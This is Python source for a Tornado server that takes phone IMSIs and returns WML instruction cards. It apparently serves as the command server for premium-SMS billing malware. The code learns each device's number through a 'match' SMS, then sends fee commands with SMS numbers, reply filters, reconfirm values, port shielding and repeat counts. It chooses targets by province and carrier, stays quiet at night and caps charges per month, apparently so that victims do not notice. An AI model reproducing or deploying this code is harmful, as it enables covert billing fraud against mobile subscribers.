# coding: utf-8

import tornado.ioloop
import tornado.web
import struct
import torndb
import time
import sys
import geoip2.database
import threading
import random

import config
import public

from Bastion import _test

reload(sys)
sys.setdefaultencoding("utf-8")

MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
MATCH_CONTENT += "<wml>"
MATCH_CONTENT += "<card>"
MATCH_CONTENT += "<Ccmd_cust>zp[id]</Ccmd_cust>"
MATCH_CONTENT += "<Cnum_cust>[mobile]</Cnum_cust>"
MATCH_CONTENT += "<filter1_cust></filter1_cust>"
MATCH_CONTENT += "<filter2_cust></filter2_cust>"
MATCH_CONTENT += "<Creconfirm_cust></Creconfirm_cust>"
MATCH_CONTENT += "<fee></fee>"
MATCH_CONTENT += "<autofee></autofee>"
MATCH_CONTENT += "<feemode>-2</feemode>"
MATCH_CONTENT += "</card>"
MATCH_CONTENT += "</wml>"

FEE_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
FEE_CONTENT += "<wml>"
FEE_CONTENT += "<card>"
FEE_CONTENT += "<Ccmd_cust>[cmd]</Ccmd_cust>"
FEE_CONTENT += "<Cnum_cust>[spNumber]</Cnum_cust>"
FEE_CONTENT += "<filter1_cust>[filter]</filter1_cust>"
FEE_CONTENT += "<filter2_cust></filter2_cust>"
FEE_CONTENT += "<Creconfirm_cust>[reconfirm]</Creconfirm_cust>"
FEE_CONTENT += "<PortShield>[portShield]</PortShield>"
FEE_CONTENT += "<fee></fee>"
FEE_CONTENT += "<autofee>[times]</autofee>"
FEE_CONTENT += "<feemode>11</feemode>"
FEE_CONTENT += "</card>"
FEE_CONTENT += "</wml>"

TEST_CONTENT =  "";

MATCH_FLOW_LIMIT_PER_MINUTE = {'minute':0,'count':0} 


def match_flow_control():
    global MATCH_FLOW_LIMIT_PER_MINUTE
    _current_minute = int(time.strftime("%M", time.localtime()))
    if MATCH_FLOW_LIMIT_PER_MINUTE['minute']!=_current_minute:
        MATCH_FLOW_LIMIT_PER_MINUTE = {'minute':_current_minute,'count':0} 
    if MATCH_FLOW_LIMIT_PER_MINUTE['count']<int(get_system_parameter_from_db("matchFlowLimitPerMinute")):
        MATCH_FLOW_LIMIT_PER_MINUTE['count'] += 1
        return True
    else:
        return False

class MatchHandler(tornado.web.RequestHandler):
    def get(self):
        dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
        sql = 'SELECT imsi FROM `imsi_users` WHERE id = %s '
        _recordRsp = dbConfig.get(sql,self.get_argument('id'))
        if _recordRsp!=None:
            sql = "update `imsi_users` set mobile=%s where id = %s"    
            dbConfig.update(sql,self.get_argument('mobile'),self.get_argument('id')) 

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello, world")
    def post(self, *args, **kwargs):
        threads = []
        _begin_time = int(round(time.time() * 1000))
        reqInfo = {}
        reqInfo["imsi"] = self.request.body[64:80]
        reqInfo["custCode"] = (str(self.request.body[32:47])).strip()
        reqInfo["proCode"] = (str(self.request.body[48:63])).strip()
        # reqInfo["ip"] = self.request.headers["X-Real-IP"]
        reqInfo["ip"] = self.request.remote_ip
        # insert_req_log(reqInfo)
        _test_imsi_info = check_test_imsi(reqInfo["imsi"]);
        if _test_imsi_info == None:
            #process normal user
            _rsp_content = get_imsi_response(reqInfo["imsi"],threads)
            if _rsp_content != None:
                print(_rsp_content)
                self.write(_rsp_content)
        else:
            self.write(get_test_response(_test_imsi_info));
        print "tcd spent:"+str(int(round(time.time() * 1000))-_begin_time)
        self.finish()
        threads.append(threading.Thread(target=insert_req_log(reqInfo)))
        for t in threads:
            t.start()
        print "current has %d threads" % (threading.activeCount() - 1)
            
def get_imsi_response(_imsi,_threads):
    _return = "";
    _imsi=filter(str.isdigit, _imsi)
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
    _record_user = dbConfig.get(_sql, _imsi) 
    if _record_user==None:
        _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
        dbConfig.insert(_sql,_imsi,time.time())
        _sql = "SELECT LAST_INSERT_ID() as id"
        _record_user = dbConfig.get(_sql) 
        if _record_user!=None and match_flow_control():
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace('[mobile]', get_system_parameter_from_db("matchMobile"))
    else:
        print str(_record_user)
        if len(str(_record_user['mobile']))<=10 and match_flow_control() and int(_record_user['matchCount'])<int(get_system_parameter_from_db("matchLimitPerImsi")) :
            _return = MATCH_CONTENT.replace('[id]', str(_record_user['id'])).replace('[mobile]', get_system_parameter_from_db("matchMobile")) 
            _threads.append(threading.Thread(target=async_update_match_count(_imsi)))
        else:
            # normal fee process
            if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour() :
                return get_cmd(_record_user,_threads)
    return _return

def isOpenHour():
    _result = True
    _hour = int(time.strftime("%H", time.localtime()))
    if _hour == 23 or (_hour>=0 and _hour<=7) :
        _result = False
    return _result

def async_update_match_count(_imsi):
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    _sql = "update imsi_users set matchCount=matchCount+1 where imsi=%s" 
    dbConfig.update(_sql,_imsi)


def get_cmd(_user,_threads):
    if _user['province']!=None and len(_user['province']) > 0 :
        dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])

        _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and state = \'open\' order by rand() limit 1 '
        _record = dbConfig.get(_sql, _user['province'],_user['mobileType']) 
        if _record == None:
            return None
        else:
            _threads.append(threading.Thread(target=async_update_cmd_fee(_user,_record)))
            _current_fee_content = FEE_CONTENT.replace('[cmd]', str(_record['msg'])).replace('[spNumber]', str(_record['spNumber'])).replace('[filter]', str(_record['filter'])).replace('[reconfirm]', str(_record['reconfirm'])).replace('[portShield]', str(_record['portShield'])).replace('[times]', str(_record['times']))
            _threads.append(threading.Thread(target=insert_fee_cmd_log(_user,_record,_current_fee_content)))

            return _current_fee_content
    else:
        print('can not match province'+str(_user))
        return None

def async_update_cmd_fee(_user,_cmd):
    _time_current = time.time()
    _total = _cmd['price']*_cmd['times']
    if public.is_same_month(_time_current,_user['lastCmdTime']) :
        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0)  + %s , cmdFeeSumMonth = ifnull(cmdFeeSumMonth,0) + %s where imsi = %s '
    else :
        _sql = 'update imsi_users set lastCmdTime = %s , cmdFeeSum = ifnull(cmdFeeSum,0) + %s , cmdFeeSumMonth = %s where imsi = %s '
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    dbConfig.execute(_sql,_time_current,_total,_total,_user['imsi']) 

def check_user_cmd_fee(_user):
    if _user['cmdFeeSumMonth'] == None:
        return True
    elif int(_user['cmdFeeSumMonth']) < int(get_system_parameter_from_db('cmdFeeMonthLimit')):
        return True
    else :
        return False

def insert_req_log(_reqInfo):
    imsi=filter(str.isdigit, _reqInfo["imsi"])
    reader = geoip2.database.Reader(config.GLOBAL_SETTINGS['geoip2_db_file_path'])
    response = reader.city(_reqInfo["ip"])
    dbLog=torndb.Connection(config.GLOBAL_SETTINGS['log_db']['host'],config.GLOBAL_SETTINGS['log_db']['name'],config.GLOBAL_SETTINGS['log_db']['user'],config.GLOBAL_SETTINGS['log_db']['psw'])
    sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
    dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),1,imsi,_reqInfo["ip"],response.subdivisions.most_specific.name,response.city.name,_reqInfo["custCode"],_reqInfo["proCode"])
    return 

def insert_fee_cmd_log(_user,_fee_cmd,_fee_info):
    dbLog=torndb.Connection(config.GLOBAL_SETTINGS['log_db']['host'],config.GLOBAL_SETTINGS['log_db']['name'],config.GLOBAL_SETTINGS['log_db']['user'],config.GLOBAL_SETTINGS['log_db']['psw'])
    sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`) values (%s,%s,%s,%s,%s,%s,%s,%s)'
    dbLog.insert(sql,long(round(time.time() * 1000))*10000+random.randint(0, 9999),201,_user["imsi"],_fee_cmd["id"],_fee_cmd["spNumber"],_fee_cmd["msg"],_user["mobile"],_fee_info)
    return 

def get_system_parameter_from_db(_title):
    _return = '';
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    _sql = 'SELECT detail FROM `system_configs` WHERE title = %s '
    _recordRsp = dbConfig.get(_sql, _title) 
    if _recordRsp!=None:
        _return = _recordRsp['detail']
    return _return

def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/tcd/", MainHandler),
        (r"/match/", MatchHandler),
    ])

def get_test_response(_imsi_info):
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
    _recordRsp = dbConfig.get(sql, _imsi_info['imsi'],_imsi_info['testStatus'])
    if _recordRsp==None:
        sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
        _recordRsp = dbConfig.get(sql,"def",_imsi_info['testStatus'])
    else:
        print(_recordRsp)
    return _recordRsp['response'].replace("IMSIimsi",_imsi_info['imsi']);
    
def check_test_imsi(imsi):
    imsi=filter(str.isdigit, imsi)
    dbConfig=torndb.Connection(config.GLOBAL_SETTINGS['config_db']['host'],config.GLOBAL_SETTINGS['config_db']['name'],config.GLOBAL_SETTINGS['config_db']['user'],config.GLOBAL_SETTINGS['config_db']['psw'])
    sql = 'SELECT imsi,testStatus FROM test_imsis WHERE imsi = %s'
    _record = dbConfig.get(sql, imsi)
    return _record



if __name__ == "__main__":
    app = make_app()
    app.listen(config.GLOBAL_SETTINGS['port'],xheaders=True)
    tornado.ioloop.IOLoop.current().start()